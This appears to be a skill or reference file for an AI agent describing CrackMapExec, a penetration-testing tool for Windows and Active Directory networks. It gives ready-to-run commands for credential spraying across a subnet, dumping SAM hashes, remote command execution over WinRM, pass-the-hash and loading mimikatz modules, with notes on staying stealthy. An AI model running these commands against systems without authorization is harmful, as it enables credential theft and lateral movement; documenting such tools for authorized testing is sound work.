---
name: crackmapexec
description: A swiss army knife for pentesting Windows/Active Directory environments. It automates network enumeration, credential spraying, and post-exploitation tasks across multiple protocols including SMB, WMI, MSSQL, and LDAP. Use it for lateral movement, dumping credentials (SAM, LSA, NTDS.dit), executing commands, and assessing domain security posture.
---

# crackmapexec (CME)

## Overview
CrackMapExec (CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. It leverages native WinAPI calls to remain stealthy and uses a modular approach to execute various attacks and enumeration tasks. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume crackmapexec is already installed. If you encounter errors:

```bash
sudo apt update
sudo apt install crackmapexec
```

## Common Workflows

### SMB Enumeration and Credential Spraying
```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --shares
```
Checks for valid credentials across a subnet and lists accessible SMB shares.

### Dumping SAM Hashes
```bash
crackmapexec smb 192.168.1.50 -u 'Administrator' -p 'Pass123!' --sam
```
Uses administrative credentials to dump local SAM hashes from the target.

### Executing Commands via WinRM
```bash
crackmapexec winrm 192.168.1.50 -u 'user' -p 'password' -x 'whoami /all'
```
Executes a specific shell command on the target via the WinRM protocol.

### LDAP Domain Enumeration
```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --users --groups
```
Enumerates all domain users and groups via LDAP.

## Complete Command Reference

### Global Options
These options apply to the main `crackmapexec` binary regardless of the protocol chosen.

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-t THREADS` | Set how many concurrent threads to use (default: 100) |
| `--timeout TIMEOUT` | Max timeout in seconds of each thread (default: None) |
| `--jitter INTERVAL` | Sets a random delay between each connection (default: None) |
| `--darrell` | Give Darrell a hand (Easter egg/Display option) |
| `--verbose` | Enable verbose output |

### Protocols
CME supports the following subcommands/protocols:

| Protocol | Description |
|----------|-------------|
| `smb` | Own stuff using SMB (Server Message Block) |
| `ssh` | Own stuff using SSH (Secure Shell) |
| `ftp` | Own stuff using FTP (File Transfer Protocol) |
| `ldap` | Own stuff using LDAP (Lightweight Directory Access Protocol) |
| `mssql` | Own stuff using MSSQL (Microsoft SQL Server) |
| `winrm` | Own stuff using WINRM (Windows Remote Management) |
| `rdp` | Own stuff using RDP (Remote Desktop Protocol) |

### Protocol-Specific Options (General Pattern)
While each protocol has unique flags, most share these common credential and execution flags:

| Flag | Description |
|------|-------------|
| `-u <user(s)>` | Username(s) or file containing usernames |
| `-p <password(s)>` | Password(s) or file containing passwords |
| `-H <hash(es)>` | NTLM hash(es) or file containing hashes (Pass-the-Hash) |
| `-M <module>` | Load a specific CME module (e.g., `mimikatz`, `lsassy`) |
| `--local-auth` | Authenticate using local accounts instead of domain accounts |
| `-x <command>` | Execute a command on the target(s) |
| `-X <ps_command>` | Execute a PowerShell command on the target(s) |

### cmedb
CME includes a built-in database manager to track discovered hosts, credentials, and vulnerabilities.

```bash
cmedb
```
- Use `workspace <name>` to switch contexts.
- Use `hosts`, `creds`, `shares` to view collected data.

## Notes
- **Opsec**: CME is designed to be "Opsec safe" by using native WinAPI calls and avoiding the upload of binaries to the target whenever possible.
- **Database**: All successful authentications and dumped credentials are automatically stored in `~/.cme/cme.db`.
- **Modules**: Use `--list-modules` after a protocol (e.g., `crackmapexec smb --list-modules`) to see available post-exploitation scripts.